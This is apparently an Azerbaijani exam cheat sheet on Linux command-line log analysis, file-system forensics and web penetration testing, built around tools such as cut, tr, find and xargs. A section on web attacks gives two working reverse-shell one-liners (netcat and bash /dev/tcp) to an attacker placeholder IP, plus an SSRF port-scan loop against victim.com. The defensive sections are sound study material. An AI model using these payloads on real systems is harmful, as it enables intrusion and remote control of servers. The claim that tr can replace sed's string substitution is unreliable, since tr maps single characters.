
## I. Log Analizi üçün Baza Əmrlər (Məhdudiyyətlərə Uyğun)
awk '{print $1}' istifadə edə bilmədiyimiz üçün sahələri (fields) ayırmaq üçün əsas silahımız **cut** və **tr** olacaq.
### 1. Web Log (Access Log) Analizi
 * **Ən çox sorğu göndərən top 10 IP ünvanını tapmaq:**
   *Normalda awk '{print $1}' yazılan hissəni cut -d' ' -f1 ilə əvəz edirik:*
   ```bash
   cat access.log | cut -d' ' -f1 | sort | uniq -c | sort -nr | head -n 10
   
   ```
 * **Uğurlu (200 OK) Command Injection və ya Şübhəli fəaliyyətləri tapmaq:**
   ```bash
   grep " 200 " access.log | grep -E "(whoami|cat|id|/etc/passwd|UNION|SELECT)"
   
   ```
 * **Ən çox istifadə olunan User-Agent-ləri (Skanerləri) tapmaq:**
   *Apache logunda User-Agent adətən 6-cı dırnaq arası sahədə olur:*
   ```bash
   cut -d'"' -f6 access.log | sort | uniq -c | sort -nr | head -n 5
   
   ```
 * **Müəyyən bir IP-nin (məsələn: 192.168.1.50) daxil olduğu bütün unikal URL-ləri çıxarmaq:**
   ```bash
   grep "192.168.1.50" access.log | cut -d'"' -f2 | cut -d' ' -f2 | sort | uniq
   
   ```
### 2. Sistem Logları (auth.log) Analizi
 * **Uğursuz SSH cəhdləri göstərən IP-ləri tapmaq:**
   *auth.log-da "Failed password for..." sətrlərindən IP-ni kəsib çıxarmaq (adətən sondan 4-cü söz olur, amma boşluqlar fərqli ola bilər. Boşluqları tr -s ' ' ilə təmizləyib sonra cut edirik):*
   ```bash
   grep "Failed password" /var/log/auth.log | tr -s ' ' | cut -d' ' -f11 | sort | uniq -c | sort -nr
   
   ```
 * **Uğurlu giriş etmiş istifadəçilərin siyahısı:**
   ```bash
   grep "Accepted password" /var/log/auth.log | tr -s ' ' | cut -d' ' -f9 | sort | uniq
   
   ```
## II. Fayl Sistemində Kəşfiyyat (Forensics & Skan)
find, xargs, du və df alətləri ilə sistemdə hücumçunun gizlətdiyi faylları və ya dəyişdirilmiş sənədləri tapmaq.
### 1. find və xargs Kombinasiyaları
 * **Son 24 saat ərzində dəyişdirilmiş (modified) .php və ya .sh fayllarını tapmaq:**
   ```bash
   find /var/www/html/ -type f \( -name "*.php" -o -name "*.sh" \) -mmin -1440
   
   ```
 * **Hər kəsə yazma icazəsi olan (world-writable) və hücumçunun sızmış ola biləcəyi qovluqları tapmaq:**
   ```bash
   find / -perm -o+w -type d 2>/dev/null
   
   ```
 * **Tapılan şübhəli faylların içində grep ilə tək sətirdə axtarış etmək (xargs istifadəsi):**
   *Məsələn, bütün .log fayllarının içində "webshell" sözünü axtarmaq:*
   ```bash
   find /var/log/ -name "*.log" | xargs grep -i "webshell"
   
   ```
### 2. Disk və Fayl Ölçülərinin Analizi (du, df)
 * **Diski dolduran böyük log fayllarını tapmaq (Böyükdən kiçiyə sıralama):**
   ```bash
   du -ah /var/log/ | sort -rh | head -n 10
   
   ```
 * **Disk sahəsinin ümumi vəziyyətini yoxlamaq:**
   ```bash
   df -h
   
   ```
## III. Web Application Attacks (Praktiki Payloads & Tək Sətirlik İcra)
İmtahanda sızma testi (Web) hissəsində sizə lazım olacaq, terminalda sürətlə istifadə edə biləcəyiniz tək sətirlik əmrlər.
### 1. Command Injection (Tək Sətirdə Reverse Shell terminal qoşulmaları)
Əgər veb-giriş pəncərəsində command injection tapsanız, qadağan olunmuş \ (line continuation) simvolu olmadan birbaşa icra ediləcək payload-lar:
 * **Netcat ilə birtərəfli əlaqə (Reverse Shell):**
   ```bash
   rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <SƏNİN_IP-N> <PORT> >/tmp/f
   
   ```
 * **Baza Bash Reverse Shell:**
   ```bash
   bash -c 'bash -i >& /dev/tcp/<SƏNİN_IP-N>/<PORT> 0>&1'
   
   ```
### 2. SSRF (Server-Side Request Forgery) üçün terminaldan test ssenarisi
Bəzən daxili portları yoxlamaq üçün terminaldan sürətli payload siyahısı yaratmaq tələb olunur:
 * **xargs ilə port skanı simulyasiyası (Dövr istifadə etmədən):**
   *Məsələn, 80, 443, 8080, 3306 portlarına SSRF sorğusu göndərmək:*
   ```bash
   echo "80 443 8080 3306" | tr ' ' '\n' | xargs -I {} curl -s "http://victim.com/preview?url=http://127.0.0.1:{}"
   
   ```
## IV. İmtahan üçün Kritik "Cheat Sheet" və Əvəzetmələr
| İstəmədiyimiz / Qadağan olan funksiya | İcazə verilən alətlərlə əvəzi (One-line) | Açıklama |
|---|---|---|
| **awk '{print $1}'** | cut -d' ' -f1 | Boşluğa görə bölüb birinci sütunu götürür. |
| **awk (Çoxlu boşluq olduqda)** | tr -s ' ' | cut -d' ' -fX | tr -s ardıcıl boşluqları tək boşluğa endirir, cut rahatlıqla sütunu kəsir. |
| **sed 's/köhnə/təzə/g'** | tr 'köhnə' 'təzə' | Sadə xarakter dəyişiklikləri üçün tr tam bəs edir. |
| **for / while dövrü** | echo "data" | xargs -n 1 command | Siyahıdakı hər bir elementi növbə ilə əmrə ötürür (Loop əvəzi). |
| **Logu həm ekrana çıxarmaq, həm fayla yazmaq** | command | tee output.txt | Boru xəttini kəsmədən məlumatı saxlayır. |
| **Böyük-kiçik hərf fərqi olmadan axtarış** | grep -i "keyword" | grep-in daxili parameteri. |
### Qızıl Qayda (tr -s və cut dueti):
Əgər ls -l və ya ps kimi çıxışlardan konkret sütun çıxarmaq istəyirsənsə və arada nizamsız boşluqlar varsa, mütləq araya tr -s ' ' qoy.
 * *Nümunə:* ls -l | tr -s ' ' | cut -d' ' -f9 (Birbaşa fayl adlarını çıxarır).
